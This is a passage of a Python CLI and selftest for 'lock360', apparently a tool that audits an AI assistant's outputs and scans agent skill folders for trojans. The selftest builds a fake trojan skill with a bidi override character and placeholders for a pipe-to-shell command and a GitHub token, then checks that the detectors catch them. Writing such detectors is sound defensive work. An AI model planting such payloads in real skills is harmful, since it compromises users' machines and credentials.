    a = audit(GOOD_S, gear="S")
    ok(a["verdict"] == "PASS", "audit good S should PASS: %s" % [f["id"] for f in a["findings"]])
    bad = GOOD_S.replace("الترس: S لأن", "فكرة رائعة! الترس: S لأن").replace("- ⭐ قبل", "| a | b |\n|---|---|\n- ⭐ قبل")
    a = audit(bad, gear="S")
    ids = set(f["id"] for f in a["findings"])
    ok(a["verdict"] == "FAIL" and "A-TABLE" in ids and "F-SYCOPHANCY" in ids, "audit bad S: %s" % sorted(ids))
    a = audit(GOOD_S.replace("الثقة الإجمالية: 80%", "الثقة الإجمالية: مرتفعة"), gear="S")
    ok("A-CONF-MISSING" in set(f["id"] for f in a["findings"]), "audit conf missing")
    a = audit(GOOD_S.replace("الحكم: نفّذ", "الثقة 90%. الحكم: نفّذ"), gear="S")
    ok("A-CONF-DUP" in set(f["id"] for f in a["findings"]), "audit conf dup")
    a = audit(GOOD_S + "\n" + FAKE["@@FAKE_SK@@"], gear="S")
    ok("A-SECRET" in set(f["id"] for f in a["findings"]), "audit secret")
    a = audit(GOOD_S, gear="M")
    ok("A-STAGE-MISSING" in set(f["id"] for f in a["findings"]), "audit S output under gear M fails")
    s = sync_check()
    ok(s["ok"], "sync with SKILL.md: %s" % s["problems"])
    ok("3.10" in skeleton("L") and "3.10" not in skeleton("S"), "skeleton gears")
    md = catalog_md()
    ok("A-TABLE" in md and not any(l.lstrip().startswith("|") for l in md.split("\n")), "catalog md is RTL-safe")
    ids = [c["id"] for c in CHECKS]
    ok(len(ids) == len(set(ids)), "check ids unique")
    ok(not any(c.startswith("SA-") for c in ids), "skill audit checks stay out of the output catalog")
    # audit-skill smoke: the core skill itself passes strict, a trojan folder fails.
    if os.path.isfile(SKILL_FILE):
        r = audit_skill(ROOT)
        ok(r["verdict"] == "PASS" and len(r["skills"]) == 1,
           "audit-skill core PASS: %s" % [(f["id"], f["file"]) for s in r["skills"] for f in s["findings"]])
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        with open(os.path.join(tmp, "SKILL.md"), "wb") as fh:
            fh.write("---\nname: x\n---\n# x\u202e\n| a | b |\n".encode("utf-8"))
        with open(os.path.join(tmp, "run.sh"), "wb") as fh:
            fh.write(expand("@@FAKE_PIPE@@\n@@FAKE_GHP@@\n").encode("utf-8"))
        r = audit_skill(tmp)
        sids = set(f["id"] for s in r["skills"] for f in s["findings"])
        ok(r["verdict"] == "FAIL" and {"SA-FRONTMATTER", "SA-TROJAN-BIDI", "SA-EXEC-PIPE", "SA-SECRET"} <= sids,
           "audit-skill trojan FAIL: %s" % sorted(sids))
        ok("SA-RTL-TABLE" not in sids, "audit-skill rtl-table needs Arabic text")
        ok(resolve_skill_targets(os.path.join(tmp, "SKILL.md")) == [tmp], "audit-skill resolves SKILL.md to its folder")
    return fails


# ------------------------------------------------------------------ CLI
def read_input(args, key_text="--text", key_file="--file"):
    if key_text in args:
        return args[args.index(key_text) + 1]
    if key_file in args:
        p = args[args.index(key_file) + 1]
        if p == "-":
            return sys.stdin.read()
        with open(p, "r", encoding="utf-8") as fh:
            return fh.read()
    if not sys.stdin.isatty():
        return sys.stdin.read()
    return None


def opt(args, key, default=None):
    if key in args:
        i = args.index(key)
        if i + 1 < len(args):
            return args[i + 1]
    return default


def main(argv):
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__.strip())
        return 0 if argv else 2
    cmd, args = argv[0], argv[1:]
    as_json = "--json" in args
    if cmd == "--selftest":
        fails = selftest()
        for f in fails:
            print("[FAIL] selftest: %s" % f)
        print("lock360 selftest: %s (%d checks registered, version %s)" % ("FAIL" if fails else "PASS", len(CHECKS), read_version()))
        return 1 if fails else 0
    if cmd == "route":
        text = read_input(args)
        if text is None:
            print("route: give --text, --file or stdin")
            return 2
        r = route(text)
        if as_json:
            print(json.dumps(r, ensure_ascii=False, indent=2))
        else:
            print("🧭 lock360 route — mode %s · level %s · gear %s%s · tone %s (%s)" % (
                r["mode"], r["level"], r["gear"], " (escalated)" if r["escalated"] else "", r["tone"], r["tone_source"]))
            print("- explicit: %s" % (", ".join(r["explicit_triggers"]) or "-"))
            print("- light: %s" % (", ".join(r["light_signals"]) or "-"))
            print("- one-way door: %s" % (", ".join(r["one_way_door"]) or "-"))
            print("- lenses: %s" % (", ".join(r["lenses"]) or "-"))
            print("- stages: %s" % (", ".join(r["required_stages"]) or "-"))
            for why in r["reasons"]:
                print("- why: %s" % why)
        return 0
    if cmd == "audit":
        out = opt(args, "--output")
        if out is None:
            print("audit: --output FILE|- is required")
            return 2
        output = sys.stdin.read() if out == "-" else open(out, "r", encoding="utf-8").read()
        req_path = opt(args, "--request")
        request = open(req_path, "r", encoding="utf-8").read() if req_path else None
        try:
            r = audit(output, request=request, gear=opt(args, "--gear"), tone=opt(args, "--tone"))
        except ValueError as exc:
            print("audit: %s" % exc)
            return 2
        print(json.dumps(r, ensure_ascii=False, indent=2) if as_json else render_audit(r))
        return 1 if r["verdict"] == "FAIL" else 0
    if cmd == "skeleton":
        print(skeleton(opt(args, "--gear", "M"), opt(args, "--tone", "mixed")))
        return 0
    if cmd == "catalog":
        if "--md" in args:
            text = catalog_md()
        else:
            text = json.dumps([{k: v for k, v in c.items() if k != "fn"} for c in CHECKS], ensure_ascii=False, indent=2)
        out_path = opt(args, "--out")
        if out_path:
            with open(out_path, "wb") as fh:
                fh.write(text.replace("\r\n", "\n").encode("utf-8"))
            print("catalog: wrote %s" % out_path)
        else:
            print(text)
        return 0
    if cmd == "audit-skill":
        target = next((a for a in args if not a.startswith("--")), None)
        if target is None:
            print("audit-skill: give a skill folder, a SKILL.md, or a folder of skills")
            return 2
        strict = "--strict" in args
        if not resolve_skill_targets(target):
            print("audit-skill: no SKILL.md found under %s" % target)
            return 2
        r = audit_skill(target)
        if as_json:
            print(json.dumps(r, ensure_ascii=False, indent=2))
        else:
            render_skill_audit(r, strict)
        return 1 if r["verdict"] == "FAIL" or (strict and r["verdict"] == "WARN") else 0
    if cmd == "eval":
        cases = opt(args, "--cases", DEFAULT_CASES)
        if not os.path.isfile(cases):
            print("eval: cases file not found: %s" % cases)
            return 2
        results = run_eval(cases)
        n_fail = sum(1 for r in results if not r["ok"])
        if as_json:
            print(json.dumps(results, ensure_ascii=False, indent=2))
        else:
            for r in results:
                print("[%s] %s (%s)%s" % ("PASS" if r["ok"] else "FAIL", r["id"], r["kind"],
                                           "" if r["ok"] else ": " + " | ".join(r["problems"])))
            print("lock360 eval: %d cases, PASS=%d FAIL=%d" % (len(results), len(results) - n_fail, n_fail))
        return 1 if n_fail else 0
    print("unknown command %r" % cmd)
    print(__doc__.strip())
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
